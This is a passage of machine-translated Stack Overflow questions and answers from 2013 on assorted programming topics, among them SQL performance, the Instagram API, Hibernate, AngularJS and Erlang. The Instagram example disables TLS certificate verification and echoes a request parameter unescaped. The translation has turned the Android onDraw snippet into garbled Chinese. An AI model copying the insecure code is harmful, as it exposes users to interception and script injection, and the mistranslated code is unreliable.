我不知道您为什么要这样做，但是您可以发出原始 sql 来查看表是否存在吗？

`SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T03:25:57.253

您可以捕获尝试访问模型时引发的异常：

```
from django.db import DatabaseError

try:
    Model.objects.exists()
except DatabaseError:
    print 'DB not yet initialized'
else:
    print 'DB table exists' 
```

# sql - 为什么有些列会减慢查询速度

> ID：14469921
> 
> 赞同：2
> 
> 时间：2013-01-22T23:27:16.487
> 
> 标签：sql, database-performance, query-performance

我正在使用 SQL Server 2012。

我正在尝试优化这样的查询：

```
SELECT TOP 20 ta.id, 
              ta.name, 
              ta.amt, 
              tb.id, 
              tb.name, 
              tc.name, 
              tc.id, 
              tc.descr 
FROM   a ta 
       INNER JOIN b tb 
               ON ta.id = tb.id 
       INNER JOIN c tc 
               ON tb.id = tc.id 
ORDER  BY ta.mytime DESC 
```

查询运行大约需要 5 - 6 秒。连接中使用的所有列都有索引。这些表有 500k 条记录。

我的问题是：当我从选择中删除列 tc.name、tc.id 和 tc.descr 时，查询会在不到一秒的时间内返回结果。为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:22:27.260

您需要发布执行计划才能真正了解其中的区别。

据我所知，SQL Server 不会*优化*连接。毕竟，即使选择列表中没有列，连接仍然可以用于过滤和相乘行数。

但是，可能会跳过一个步骤。使用 中的变量`select`，引擎需要同时访问索引*并*获取包含数据的页面。如果没有变量，引擎就不需要进行提取。这可能会巧妙地将优化器的平衡从一种连接类型转变为另一种连接类型。

第二种可能性只涉及时间安排。如果您运行一次查询，则可能会在机器上填充页面缓存。第二次运行它时，查询速度要快得多，因为数据在内存中。除非您 (1) 在每次调用之间清除缓存或 (2) 确保缓存已被等效填充，否则永远不要运行计时。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T04:51:01.280

你有聚集索引吗？如果没有，您应该创建聚集索引并运行查询整数，并且主要在主键列上运行。

检查聚集索引的[http://msdn.microsoft.com/en-us/library/aa933131(v=sql.80).aspx](http://msdn.microsoft.com/en-us/library/aa933131(v=sql.80).aspx)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-11T18:50:14.970

我终于能够通过向表中添加额外的索引来调整查询。SQL 服务器没有显示/暗示丢失的索引，但我通过在选择中存在的字段上创建一个新的非聚集索引来解决这个问题。

感谢大家前来提供帮助。

@Wade 该链接对于理解 SQL 优化器非常有帮助

# windows-8 - 查询 Winrt App 的触控功能

> ID：14469922
> 
> 赞同：1
> 
> 时间：2013-01-22T23:27:20.753
> 
> 标签：windows-8, windows-runtime, touch, capability

> **可能重复：**
> [检测 Windows 8 应用商店应用程序是否有触摸屏](https://stackoverflow.com/questions/12664228/detect-whether-a-windows-8-store-app-has-a-touch-screen)

对于 WinRT 应用，有没有办法查询运行该应用的设备是否支持触控？我问是因为我有一个游戏的屏幕控制，如果你没有触摸就不需要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-23T05:00:24.040

[Windows.Devices.Input.TouchCapabilities](http://msdn.microsoft.com/en-tt/library/windows/apps/windows.devices.input.touchcapabilities)应该这样做。

```
var t = new Windows.Devices.Input.TouchCapabilities();
bool hasTouch = t.TouchPresent != 0; 
```

开发中心也有一个[示例](http://code.msdn.microsoft.com/windowsapps/Input-device-capabilities-31b67745)。

# php - Instagram API 订阅，如何获得帖子？

> ID：14469924
> 
> 赞同：2
> 
> 时间：2013-01-22T23:27:38.373
> 
> 标签：php, api, post, instagram

我正在努力了解如何获取查找特定标签的 Instagram 订阅的结果。最终，我想做的是在发布带有我要查找的标签的图像时，将链接添加到照片以及将用户名添加到数据库。

我能够毫无问题地创建我的订阅，但现在我不确定如何从订阅中获取 POST 信息。

使用两个文件...subscribe.php 和 callback.php

**订阅.php**

```
<?php

//ALL YOUR IMPORTANT API INFO
$client_id = 'XXX';
$client_secret = 'XXX';
$object = 'tag';
$object_id = 'taglookingfor';
$aspect = 'media';
$verify_token='';
$callback_url = '(full URL here)/callback.php';

//SETTING UP THE CURL SETTINGS...
$attachment =  array(
'client_id' => $client_id,
'client_secret' => $client_secret,
'object' => $object,
'object_id' => $object_id,
'aspect' => $aspect,
'verify_token' => $verify_token,
'callback_url'=>$callback_url
);

//URL TO THE INSTAGRAM API FUNCTION
$url = "https://api.instagram.com/v1/subscriptions/";

$ch = curl_init();

//EXECUTE THE CURL...
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $attachment);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  //to suppress the curl output 
$result = curl_exec($ch);
curl_close ($ch);

//PRINT THE RESULTS OF THE SUBSCRIPTION, IF ALL GOES WELL YOU'LL SEE A 200
print_r($result);

?> 
```

**回调.php**

```
 <?php

if (isset ($_GET['hub_challenge'])){
    echo $_GET['hub_challenge'];
}

//This is an update
else {

    $myString = file_get_contents('php://input');
    $answer = json_decode($myString);
    echo $answer;
}

?> 
```

在我的 callback.php 中，我试图回显 json_decode 的结果......但这也引出了一个问题，我将如何捕捉那个回声？抱歉，这可能真的很傻，但是我如何捕捉到回调.php 脚本被带有我正在寻找的特定标签的新图像触发的时刻。正如我提到的，我希望做的是获取 $answer 中的信息并将一些信息插入数据库。

我是新来的，所以任何帮助将不胜感激。太感谢了！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-29T20:59:19.910

我感觉到你的痛苦。他们的 API 不是最容易使用的，而且他们的文档还有很多不足之处。也就是说，这就是发生的事情：

1.  您向订阅 API 端点发送请求
2.  Instagram 向您的 callback.php 文件发送响应
3.  响应包含一个 hub_challenge 参数，您需要回显该参数以确认您的订阅
4.  如果成功，您将在 callback.php 中收到一条带有新订阅的订阅 ID 的帖子
5.  每次您在 callback.php 中收到帖子时，您都需要向 Instagram 发出与您的标签匹配的最新媒体的请求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-18T02:44:01.987

我认为您的回调 url 无法接收任何发布数据，您可以尝试向您的回调 url 发布一些内容

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-31T18:34:52.853

我希望我的[这个](https://stackoverflow.com/a/44292284/5321614)答案对有类似问题的人有所帮助。

# java - Hibernate ObjectNotFoundException 不一致

> ID：14469925
> 
> 赞同：1
> 
> 时间：2013-01-22T23:27:45.710
> 
> 标签：java, hibernate

我在两个实体之间具有以下一对一（可选）关系：

```
@Entity
@Table(name = "HLTH_RQRMT")
public class Requirement
{
    ...
    @OneToOne(mappedBy = "healthRequirement", cascade = CascadeType.ALL)
    private HealthRequirementSystemIdentifier requirementSystemId;

    ...
    public HealthRequirementSystemIdentifier getRequirementSystemId()
    {
        return requirementSystemId;
    }
}

@Entity
@Table(name = "HLTH_RQRMT_SYS_IDNTFR")
public class HealthRequirementSystemIdentifier
{

    @OneToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "Hlth_Rqrmt_Id", nullable = false)
    private Requirement healthRequirement;
} 
```

从数据库加载需求后，会检查标识符：

```
//Load will always return a result (or exception) - works correctly.
Requirement requirement = (Requirement) getSession().load(Requirement.class, id);

//This is where the exception is thrown
if (requirement.getRequirementSystemId() == null) 
```

当有标识符时，代码在所有环境中都可以正常工作。当没有标识符时，它在单元测试和本地（通过针对生产数据库的测试确认）中工作正常。当生产中没有标识符时，会抛出以下错误：

```
org.hibernate.ObjectNotFoundException: No row with the given identifier exists:
[Requirement#250583] at
org.hibernate.impl.SessionFactoryImpl$2.handleEntityNotFound(SessionFactoryImpl.java:419) at
org.hibernate.proxy.AbstractLazyInitializer.checkTargetState(AbstractLazyInitializer.java:154) at
org.hibernate.proxy.AbstractLazyInitializer.initialize(AbstractLazyInitializer.java:143) at 
org.hibernate.proxy.AbstractLazyInitializer.getImplementation(AbstractLazyInitializer.java:174) at
org.hibernate.proxy.pojo.javassist.JavassistLazyInitializer.invoke(JavassistLazyInitializer.java:190) at
Requirement_$$_javassist_66.getRequirementSystemId(Requirement_$$_javassist_66.java) at
mypackage.myclass.processResponse(MyServiceImpl.java:244) 
```

`optional=false`我可以通过将属性添加到映射注释来触发单元测试中的上述错误。

什么可能导致单元测试和生产之间的结果不同？该`optional`属性的默认值为 true，这就是它在单元测试中正常工作的原因。如果我添加属性`optional=true`，它对单元测试没有影响，但它可能会解决生产中的问题吗？

我知道注释`@NotFound(action=NotFoundAction.IGNORE)`，但我更愿意在忽略它之前了解问题的原因。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T23:32:26.540

你应该使用`getSession.get()`而不是`getSession().load()`

如果 load() 在缓存或数据库中找不到对象，则会引发异常。load() 方法永远不会返回 null。如果找不到对象，get() 方法将返回 null。

> load() 方法可能返回一个代理而不是一个真正的持久实例。代理是第一次访问时触发加载真实对象的占位符；我们将在本节后面讨论代理。另一方面， get() 从不返回代理。

在 get() 和 load() 之间进行选择很容易：如果您确定持久对象存在，并且不存在将被视为异常，那么 load() 是一个不错的选择。如果您不确定是否存在具有给定标识符的持久实例，请使用 get() 并测试返回值以查看它是否为空。使用 load() 有进一步的含义：应用程序可以检索到持久实例的有效引用（代理），而无需访问数据库来检索其持久状态。*因此 load() 在缓存或数据库中找不到持久对象时可能不会抛出异常；当访问代理时，稍后将引发异常。*

# apache - 在这种情况下，为什么 Alias 工作，但 AliasMatch 失败？

> ID：14469927
> 
> 赞同：1
> 
> 时间：2013-01-22T23:28:10.297
> 
> 标签：apache, httpd.conf, mod-alias

尝试匹配此代码时：

```
Alias /assets/ "/home/virtual/public_assets/"
AliasMatch ^/~([a-zA-Z0-9]+)/assets/(.*)$     /home/virtual/public_assets/$2

AllowOverride All 
```

到以下 URI

```
/~admin30/assets/js/tests.js 
```

该`Alias`指令适用于我们的实时站点，但是`AliasMatch`应该与用户目录匹配的 , 不起作用。这里有什么问题`AliasMatch`？

# javascript - 将长字符串格式化为 JSON

> ID：14469928
> 
> 赞同：0
> 
> 时间：2013-01-22T23:28:14.600
> 
> 标签：javascript, json

我有从外部数据源获得的这个字符串。它看起来像这样：

```
var myString =  "Worker Management System :

    Your request has been submitted
    ________________________________________
    Your Account User Info: 
    Name : Doe, John, A 
    ID : JDOE123    
    Email :         
    Title : Worker
    BusinessUnit : BARN
    Department : PIGS   
    EmployeeID :            
    SupervisorName : Doe, Jane, B
    HireDate : 02/22/2002   
    Role : Feed Pigs;   
    ManagerEmail : JaneDoe@mail.com

    City : New York
    State : NY
    ZipCode : 12345
    Phone : --  
    " 
```

我想将其解析为 JSON（或我可以使用的东西），以便我可以调用 myString.Name 并让它返回 Doe, John, A.

这可能吗？修改获取此字符串的方式不是我的选择，我只是尝试对其进行格式化，以便可以轻松地从中提取数据。

我已经查看了 Douglas Crockford's `JSON.parse`，但如果我的字符串尚未正确格式化，那对我没有任何好处。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:33:55.110

```
String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g, '');};

function my_string_to_object(myString)
{
    var tmp = myString.split('Your Account User Info: ',2);
    var tmp = tmp[1].split("\n");    
    var obj = {};
    for(var k=0;k<tmp.length;k++) {    
        var line = tmp[k].split(' : ');
        if(typeof(line[1]) != 'undefined') {
            obj[ line[0].trim() ] = line[1].trim();
        }
    }
    return obj;
} 
```

# google-maps - 在 GE 插件中切换 kml 文件夹的可见性

> ID：14469932
> 
> 赞同：1
> 
> 时间：2013-01-22T23:28:40.853
> 
> 标签：google-maps, google-maps-api-3

我在上下搜索了一段显示这一点的 java 脚本代码，但我想弄清楚的是如何使用复选框或类似工具切换 KML 的一部分，主要是文件夹。目前，KML 使用网络链接加载到插件中。

我发现的所有示例都希望您对所有内容都有单独的 kml 文件，但考虑到我正在处理的资产数量之多，这是不可行的。我知道这是可能的。我正在寻找的只是“单击此，然后出现此“文件夹””的一个示例。

任何帮助是极大的赞赏！

# android - Android - 使用 drawRect 在 SurfaceView 上更改画布的一部分 alpha - 可能吗？

> ID：14469935
> 
> 赞同：1
> 
> 时间：2013-01-22T23:28:49.597
> 
> 标签：android, android-canvas, surfaceview

是否可以改变画布的一部分 alpha 来改变它的不透明度？我正在寻找的是这样的：

> ```
> 公共无效 onDraw（画布画布）{
>    canvas.drawARGB(255,0,0,0);
>    .
>    .
>    //其他图片（Canvas.drawBitmap()）放在这里
>    .
>    .
>    油漆油漆 = 新油漆（）；
>    油漆.setAlpha(100);
>    canvas.drawRect(20,50,40,100, 油漆);
> }
> 
> ```

我正在尝试创建一个游戏，当玩家遇到高大的障碍物时，可以通过 alpha 为 100 的障碍物看到他的身体的一部分（例如，只有他的脚），这取决于他的身体被覆盖的程度障碍。我试过做一个例子（就像上面的例子），但它不起作用。我希望有一种方法来做类似的事情。不过，它不必是drawRect。谢谢！

PS这是我第一次在stackoverflow上发帖，所以请多多包涵。谢谢。:)

# svn - svn 同步钩子脚本

> ID：14469940
> 
> 赞同：1
> 
> 时间：2013-01-22T23:29:25.690
> 
> 标签：svn, hook, svnsync

我正在研究通过代理写入的最终配置和复制。我有一台主服务器和两台从服务器。apache 配置正常工作，但我在试图找出需要调用哪些钩子以便复制发生回从属服务器时遇到问题。我可以从主服务器手动执行 svnsync，但我不能让它与钩子一起工作。

在从服务器上，我有一个空的 pre-revprop-change.bat，只需退出 0。在主服务器上，我有一个 pre-lock.bat，它发出一个 svn propdel 命令来释放远程存储库上的锁。我还有一个 start-commit.bat，它有 svnsync init 和 svnsync sync 命令。当我进行提交时，该过程就会超时。

对我所缺少的有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-22T08:11:00.193

你的设置太复杂了。一旦你设法手动初始化 svnsync 进程，你只需要添加以下行到你的 post-commit 钩子

```
/usr/bin/svnsync sync --non-interactive --no-auth-cache --source-username=XXX --source-password='XXX' --sync-username=YYY --sync-password='YYY' http://source/svn-proxy-sync/REPO 2>&1 > /dev/null & 
```

不要删除 -r0 属性上的锁定，因为如果您使用上述 post-commit 钩子进行两次提交，第二次提交可能会尝试同步 repo，而第一次提交仍在后台执行。

2>&1 > /dev/null 是必需的，否则svnsync的后台不起作用。

# python - 音频领域特定语言与 Python

> ID：14469941
> 
> 赞同：0
> 
> 时间：2013-01-22T23:29:28.290
> 
> 标签：python, audio, dsl, supercollider

我想编写一些代码来进行声学分析，并且正在尝试确定适合该工作的工具。我通常会在 Python 中使用 numpy 和 scipy 以及可能的 Cython 来编写类似的东西作为分析部分。我发现 Python 音频库的世界有点混乱，有大量非常有限的包处于各种开发状态。

我还遇到了一堆音频/声学特定语言，如 SuperCollider、Faust 等，它们似乎使音频处理变得容易，但在 IO 和分析能力方面可能会受到限制。

我目前正在使用默认安装的 Alsa 和 PulseAudio 在 Linux 上工作。如果可能的话，我宁愿不涉及各种和杂乱无章的其他音频包，比如 Jack，尽管这不是一个硬性要求。

我对这个问题的主要兴趣是确定是否有一种特定领域的语言可以提供更快的原型设计和测试，或者像 Python 这样的通用语言是否更合适。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-05T12:03:03.177

我对 SuperCollider 和 Python（有和没有 Numpy）有很多经验。我做了很多音频分析，恐怕答案取决于你想做什么。

1.  如果你想创建实时输入或输出音频的系统，那么 Python 不是一个好的选择。音频 I/O 库（如您所说）有点粗略。还有一个基本问题是 Python 的垃圾收集器并不是真正为实时数据而设计的。**您应该使用从头开始设计的实时系统。**SuperCollider 非常适合这一点，正如 caseyanderson 所指出的，音频分析的一些标准构建块就在那里。还有其他环境。

2.  如果你想做一些核心工作，比如应用各种机器学习算法，不一定是实时的（即，如果你可以读/写 WAV 文件而不是实时音频），那么**你应该使用通用编程语言广泛的支持，以及一个好的库生态系统，可以满足**您的额外需求。将 Python 与诸如 numpy 和 scikits-learn 之类的库一起使用非常适合这一点。它有利于快速原型制作，但它不仅缺乏可靠的实时音频，而且标准音频构建块也少得多。在制作音频管道原型时，这两件重要的事情会阻碍你。

所以，那么，你被夹在这两个选项之间。根据您的应用程序，您可以通过在实时环境中操作音频 I/O 以及使用**OSC 消息传递**或 shell 脚本与外部 Python 进程进行通信来**将两者结合起来。**那里的限制是你不能真正在两者之间抛出大量数据（你不能明智地将所有音频传输到其他进程，这很愚蠢）。

 *** * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-24T23:51:18.783

SuperCollider 对这些方面有很多支持，无论是作为外部/插件还是 Quarks。也就是说，这完全取决于您想要做什么。如果您只是想检测事件，`Onsets.kr`那就没问题了。如果您正在寻找频率/音高信息，`Pitch`或者`Tartini`会工作（我发现`Tartini`更准确）。如果您尝试跟踪幅度，则结合使用`Amplitude.ar`一些简单的数学运算也可以。

类似地，有`SpecCentroid.kr`（用于一种亮度分析）、`Loudness.kr`、`SpecFlatness.kr`等。

以上都是非常笼统的，还有更多（`JoshUGens`externals 包有一些有趣的 FFT 相关的声学材料）。所以我建议下载这个程序，加入邮件列表（如果你有更多的问题），它就住[在这里](http://www.beast.bham.ac.uk/research/sc_mailing_lists.shtml)，并在 Externals、Quarks 和 Standard UGens 中四处寻找。

尽管如此，由于我不确定您要做什么，因此我无法提出比上述更具体的建议，而且我认为为此去 SC 是最有意义的，而不是用 Python 编写自己的所有工具从头开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-27T15:24:21.920

我不是 100% 确定你想做什么，但作为一个额外的建议，我会提出：Spear with scripting in Common Lisp。如果您正在做的事情涉及大量频谱分析，那么您可以在 Spear 中进行繁重的提升，并使用 Common List with Common Music 编写所有这些脚本。Spear 在编辑非常具体的部分方面有一些很棒的工具。**

# angularjs - AngularJS $routeProvider，回退到默认链接导航

> ID：14469946
> 
> 赞同：5
> 
> 时间：2013-01-22T23:29:45.020
> 
> 标签：angularjs

因此，我的网站并非 100% 都是“由 AngularJS 提供支持”，其中一些只是简单的静态 HTML，如登录页面或面向内容的东西，出于显而易见的原因，这是简单的 HTML。

我似乎可以获得正常导航的链接的唯一方法是这样的：

```
 $routeProvider
    .when('/plans', {templateUrl: '<%= asset_path('ng/views/start.html') %>'})
    # Catch all
    .otherwise({ redirectTo: (p,loc) -> window.location = loc }) 
```

感觉就像我可以做的那样，一切都应该更简单`.otherwise(false)`，它只会正常导航。`.when('/something'/, false) 也是如此，但我在文档中没有看到任何表明这是可能的内容。

有谁知道更好的方法来做到这一点？

编辑1：

我发现的一种解决方案是`target='_self'`在链接中使用。

另一个显然是设置应用程序的“基本 url”，如[docs 中所述](http://docs.angularjs.org/guide/dev_guide.services.%24location)。然后，该基础之外的任何链接都应正常导航。但是，这似乎不像概述的那样工作，并且该示例也不符合文档的建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:43:22.453

只是创建一个指向它的[外部文件的链接](/external.file)

如果您使用的是 hashbang url（例如 #/plans），那么您应该全部设置好，如果您使用的是 html5 history api ($locationProvider.html5(true))，那么您需要命名您的应用程序（正确设置 base[href]）并将内容放在该命名空间之外。

相关代码：

[https://github.com/angular/angular.js/blob/4df45b20d460239a0f5001fb0dd59f95e2d0e80d/src/ng/location.js#L560](https://github.com/angular/angular.js/blob/4df45b20d460239a0f5001fb0dd59f95e2d0e80d/src/ng/location.js#L560)

另一种解决方案是`target="_self"`在该`a`元素上使用。同样，只有在使用 html5（历史 pushState）时，这才是一个问题。

# sql - 生成的 SQL 抛出错误

> ID：14469951
> 
> 赞同：0
> 
> 时间：2013-01-22T23:29:52.907
> 
> 标签：sql, orm, h2

我正在使用带有加载项的 Visual Studio 来创建 ORM 数据库模型并从中生成 SQL。事实证明，SQL 抛出错误。这是一部分：

```
CREATE TABLE ORMModel1.Milking
(
    employeeName CHARACTER VARYING(32672) NOT NULL,
    parlorNumber SMALLINT CHECK (parlorNumber BETWEEN 1 AND 2) CHECK (parlorNumber BETWEEN 0 AND 255) NOT NULL,
    startDate TIMESTAMP NOT NULL,
    cowName CHARACTER VARYING(32672) NOT NULL,
    lipidity FLOAT(4) NOT NULL,
    volume FLOAT(4) NOT NULL,
    CONSTRAINT Milking_PK PRIMARY KEY(employeeName, startDate, parlorNumber),
    CONSTRAINT Milking_UC1 UNIQUE(employeeName, cowName, startDate),
    CONSTRAINT Milking_UC2 UNIQUE(cowName, startDate, parlorNumber)
); 
```

抛出的错误是：

```
expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, REFERENCES, ,, )"; 
```

但我不知道这意味着什么（我有点失望，因为我希望自动生成的 SQL 是即插即用的）

由于这是一项学校作业，我使用 www.h2database.com 来测试 SQL。我不确定错误是在我的 SQL 中还是在 H2 软件中，但无论哪种方式我都无法继续我的项目。目前，H2 是我对 SQL 服务器的唯一访问权限。

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:42:30.937

将第 4 行更改为：

```
parlorNumber SMALLINT NOT NULL CHECK (parlorNumber BETWEEN 1 AND 2), 
```

# validation - 检查自定义 Validator 中的必填字段

> ID：14469952
> 
> 赞同：2
> 
> 时间：2013-01-22T23:29:54.150
> 
> 标签：validation, jsf, composite-component, required

我已经设置了一个自定义验证器以在复合组件的元素上运行。它看起来像这样：

```
<myproject:myComponent>
    <f:validator validatorId="customValidator" for="validatedField" />
</myproject:myComponent> 
```

复合组件如下所示：

```
<composite:interface>
    <composite:editableValueHolder name="validatedField" targets="validatedField" />
</composite:interface>
<composite:implementation>
    <h:inputText id="validatedField" />
</composite:implementation> 
```

它大部分都在工作，但有一个小问题：我如何根据需要指定一个字段？

看来，当我将已验证字段完全留空时，根本不会调用自定义验证器。我尝试在`<f:validateRequired for="validatedField" />`内部添加一个`mycomponent`，但它没有用。

* * *

**编辑**（响应 BalusC）：对我的复合组件出现的上下文的更详细描述：

```
<p:outputPanel id="pnlElements">
    <ui:repeat value="#{backingViewBean.elementDtos}" var="elementDto">
        <p:commandButton value="Edit..."
                         action="#{backingControllerBean.refreshView}"
                         ajax="true"
                         update=":frmMain:editElement"
                         oncomplete="wdgEditElement.show()">
            <f:setPropertyActionListener  
                             target="#higherLevelControllerBean.currentElementId}"
                             value="#{elementDto.Id}" />
        </p:commandButton>
    </ui:repeat>
</p:outputPanel>

<p:dialog widgetVar="wdgEditElement" modal="true">
    <p:outputPanel id="editElement">
        <myproject:myComponent>
            <f:validator validatorId="customValidator" for="validatedField" />
        </myproject:myComponent>
    </p:outputPanel>
</p:dialog> 
```

该页面显示了我创建的元素的列表，每个元素都有一个编辑按钮（以及我省略的其他内容）。单击编辑按钮，会弹出一个窗口，其中包含复合组件（以及保存按钮，为清楚起见再次省略），我可以在其中编辑元素。

问题是，当我设置`javax.faces.VALIDATE_EMPTY_FIELDS`为时`true`，验证器会在填充编辑窗口的数据对象被设置之前被调用，它会因为我有空字段而对我咆哮。（并且在设置数据对象之前中止执行，因此所有字段都显示为空。）

（此外，我注意到当 when`VALIDATE_EMPTY_FIELDS`设置为时`false`，我第二次和随后的点击 Edit 按钮也会触发对验证器的调用。这看起来无害，但不是我所期望的行为。）

我在 Glassfish 下运行，所以我希望`<f:validateRequired>`能正常工作——所以也许我用错了。我是这样使用它的：

```
<myproject:myComponent>
    <f:validator validatorId="customValidator" for="validatedField" />
    <f:validateRequired for="validatedField" />
</myproject:myComponent> 
```

我做错了吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-23T13:04:57.970

仅当`<f:validateRequired>`您的 Web 应用程序中启用了 JSR303 bean 验证时才有效（这通常在 Java EE Web 配置文件兼容的服务器中，例如 Glassfish、JBoss AS 和 TomEE，但因此不适用于像 Tomcat 这样的简单 servlet 容器）。如果您的 webapp 没有，那么您需要手动强制对空字段进行 bean 验证，如下所示`web.xml`：

```
<context-param>
    <param-name>javax.faces.VALIDATE_EMPTY_FIELDS</param-name>
    <param-value>true</param-value>
</context-param> 
```

# erlang - 在 Windows 上使用换行符

> ID：14469955
> 
> 赞同：2
> 
> 时间：2013-01-22T23:30:06.753
> 
> 标签：erlang

我在 erlang 中遇到了 ~n 的问题，尝试了 2 天将数据列表写入文件 io:format(file, "~s~n", [X])。

当然，我曾尝试使用 map 和 foreach 来遍历列表，但我仍然将所有内容放在 1 行而不是换行符上。该列表是从不同文件中读取的行列表。这是一个Windows操作系统。

我错过了什么吗？在 Windows 上执行此操作有什么替代方法吗？我一直在阅读许多教程并在这里寻求帮助，但我开始认为没有适合我的解决方案：/ 任何其他语言的一些非常简单的任务，即使是 haskell 也可以做到。

我可以将列表打印到控制台，它会像我阅读的文本一样显示。但是当我将此列表写入文件时，它全部显示在 1 行中。所以：

```
blah
blah
blah 
```

变成

```
blah blah blah 
```

我无法解决这个问题:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:48:21.553

Windows 换行符是`\r\n`（回车和换行符）。

尝试：

```
io:format(File, "~s\r\n", [X]). 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-21T23:13:25.263

所以假设你有（在你的例子中）：

```
Data = ["blah", "blah", "blah"]. 
```

然后：

```
io:format(File, "~s\r\n", [string:join(Data, "\r\n")]). 
```

会在 Windows 上做你想做的事。坦率地说，“~n”应该是平台相关的，但它不适用于我的 Erlang 版本，所以“\r\n”是必要的，即

```
io:format(File, "~s~n", [string:join(Data, "\n")]). 
```

应该工作，但没有。

# php - 如何在新窗口中打开链接？

> ID：14469956
> 
> 赞同：-1
> 
> 时间：2013-01-22T23:30:17.890
> 
> 标签：php, wordpress

这是我的网站：jahde.co/stream。我希望“关于我>>jahde.co”链接在新窗口中打开，但它不起作用（target="_blank"）。此外，我如何删除另一个“关于我”侧边栏链接，该链接将转到另一个页面（不是外部网站）？

```
 <?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu' ) ); ?>

            <?php if (!empty($options['twitter_username'])): ?>
                <li class="link email"><a href="http://jahde.co" target="_blank">About Me</a></li>
                <li class="link twitter">
                    <a target="_blank" href="http://twitter.com/<?php echo $options['twitter_username'] ?>">@<?php echo $options['twitter_username'] ?></a>
                </li>
            <?php endif ?> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T23:36:13.203

您网站上的元素如下所示：

```
<a href=​"http:​/​/​jahde.co/​stream/​sample-page/​">​About Me​&lt;/a> 
```

你没有添加`target="_blank"`到锚点。

我尝试通过我的控制台在 Chrome 中添加该属性，它按预期工作。

# email - 将电子邮件地址传递给 VBA 中的 SendObject 方法

> ID：14469957
> 
> 赞同：3
> 
> 时间：2013-01-22T23:30:31.060
> 
> 标签：email, vba, ms-access-2007

我想从我的表“GetContact_TempTbl”中获取电子邮件地址并将报告发送到该电子邮件地址。此电子邮件将根据收到的公司而更改。我目前提取相关的电子邮件地址并将其存储在临时表中。我目前得到 Object Required 错误。

非常感谢您的建议。

```
Dim db As Database
Dim rs As Recordset
Dim stRecipients As String
Dim stDocName As String

Set db = CurrentDb()
Set rs = db.OpenRecordset("GetContact_TempTbl")
Set stRecipients = rs.Fields("Contact_Email")
stDocName = "License CODs"
stRecipietns = stRecipients

DoCmd.SendObject acReport, stDocName, acFormatPDF, stRecipients, , , "Thank You for your purchase" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:14:49.913

如果您的记录集为您要发送电子邮件的每个收件人保留一行，请遍历记录集以收集它们，而不是仅读取第一行中的收件人。

```
Const stDocName As String = "License CODs"
Dim db As DAO.database
Dim rs As DAO.Recordset
Dim stRecipients As String

Set db = CurrentDb()
Set rs = db.OpenRecordset("GetContact_TempTbl")
With rs
    Do While Not .EOF
        stRecipients = stRecipients & ";" & !Contact_Email
        .MoveNext
    Loop
    .Close
End With

If Len(stRecipients) > 0 Then
    ' discard leading ";"
    stRecipients = Mid(stRecipients, 2)
    DoCmd.SendObject acReport, stDocName, acFormatPDF, _
        stRecipients, , , "Thank You for your purchase"
Else
    MsgBox "No recipients to email!"
End If

Set rs = Nothing
Set db = Nothing 
```

但是，如果我的解释不正确，并且记录集总是包含只有一行的单行`Contact_Email`，那么您甚至不需要记录集。您可以简单地检索`Contact_Email`with `DLookup`。

```
stRecipients = Nz(DLookup("Contact_Email", "GetContact_TempTbl"), "") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:42:13.547

你应该只使用`set`一个对象，而不是一个字符串：

```
Dim db As Database
Dim rs As Recordset
Dim stRecipients As String
Dim stDocName As String

Set db = CurrentDb()
Set rs = db.OpenRecordset("GetContact_TempTbl")
''This is not a field object, it is a string
stRecipients = rs.Fields("Contact_Email")
stDocName = "License CODs"
stRecipietns = stRecipients

DoCmd.SendObject acReport, stDocName, acFormatPDF, _
   stRecipients, , , "Thank You for your purchase" 
```

如果您说明如何创建临时表，则可能会使这更容易。

# scala - 如何将句子拆分为由多个空格分隔的单词？

> ID：14469958
> 
> 赞同：26
> 
> 时间：2013-01-22T23:30:33.553
> 
> 标签：scala

以下代码：

```
val sentence = "1 2  3   4".split(" ") 
```

给我：

```
Array(1, 2, "", 3, "", "", 4) 
```

但我宁愿只有这些词：

```
Array(1, 2, 3, 4) 
```

当单词被多个空格分隔时，如何拆分句子？

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2013-01-22T23:41:06.870

使用正则表达式：

```
scala> "1   2 3".split(" +")
res1: Array[String] = Array(1, 2, 3) 
```

“+”表示“前面的一个或多个”（前面是一个空格）。

更好的是，如果您想拆分所有空格：

```
scala> "1   2 3".split("\\s+")
res2: Array[String] = Array(1, 2, 3) 
```

